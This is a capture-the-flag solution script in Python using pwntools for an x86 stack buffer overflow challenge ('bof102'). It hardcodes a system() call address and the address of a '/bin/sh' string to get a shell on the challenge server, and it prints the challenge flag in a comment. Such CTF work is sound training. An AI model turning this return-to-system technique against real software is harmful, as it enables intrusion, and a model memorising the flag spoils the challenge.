#!/usr/bin/env python3
#SCTF{B0F_A774ck_w1Th_arg5_1n_x86}
#python3 solution.py

from pwn import *

p = remote("bof102.sstf.site", 1337, ssl=False)
#p = process("./bof102")
#raw_input("attach gdb")

p.recvuntil("Name >")
payload = b"/bin/sh"
p.sendline(payload)

p.recvuntil("snowman?\n >")

#pad = cyclic(512, n=4)
pad = b'A' * cyclic_find("faaa", n=4)

system_call_addr = b"\xcf\x85\x04\x08"
name_var_addr_in_data_section = b"\x34\xa0\x04\x08"

payload = pad + system_call_addr + name_var_addr_in_data_section
print(payload)
p.sendline(payload)

p.interactive()

